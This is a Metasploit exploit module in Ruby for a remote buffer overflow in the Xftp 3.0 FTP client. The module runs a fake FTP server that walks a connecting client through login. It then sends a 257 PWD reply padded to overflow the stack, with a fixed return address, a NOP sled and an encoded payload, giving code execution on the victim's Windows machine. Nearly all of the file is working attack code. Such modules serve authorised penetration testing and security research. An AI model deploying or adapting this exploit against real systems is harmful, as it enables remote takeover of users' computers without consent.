##
# $Id: xftp_client_pwd.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Xftp FTP Client 3.0 PWD Remote Buffer Overflow Exploit',
			'Description'    => %q{
					This module exploits a buffer overflow in the Xftp 3.0 FTP client that is triggered
				through an excessively long PWD message.
			},
			'Author' 	 =>
				[
					'zombiefx',  # Original exploit author
					'dookie'     # MSF module author
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'OSVDB', '63968'],
					[ 'URL', 'http://www.exploit-db.com/exploits/12332' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 434,
					'BadChars' => "\x00\x0a",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Ret' => 0x100123AF } ], # JMP ECX in nslicense.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Apr 22 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The FTP daemon port to listen on", 21 ]),
				OptString.new('SRVNAME', [ true, "Welcome to the ... FTP Service", "Test" ]),
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)

		buffer = "220 Welcome to the " + datastore['SRVNAME'] + " FTP Service.\r\n"
		client.put(buffer)
	end

	def on_client_data(client)

		# Get the client username
		client.get_once

		# Prompt the client for the password.
		user = "331 Anonymous access allowed.\r\n"
		client.put(user)
		client.get_once

		# Handle the clients PWD command.
		pass = "230 Login successful.\r\n230 User logged in.\r\n"
		client.put(pass)
		client.get_once

		# Send the exploit
		sploit = "257 \"/"
		sploit << rand_text_alpha_upper(1019)
		sploit << [ target.ret ].pack('V')
		sploit << make_nops(55)
		sploit << payload.encoded
		sploit << "\" is current directory.\r\n"

		client.put(sploit)

		# Get the CWD from the client
		client.get_once

	end

end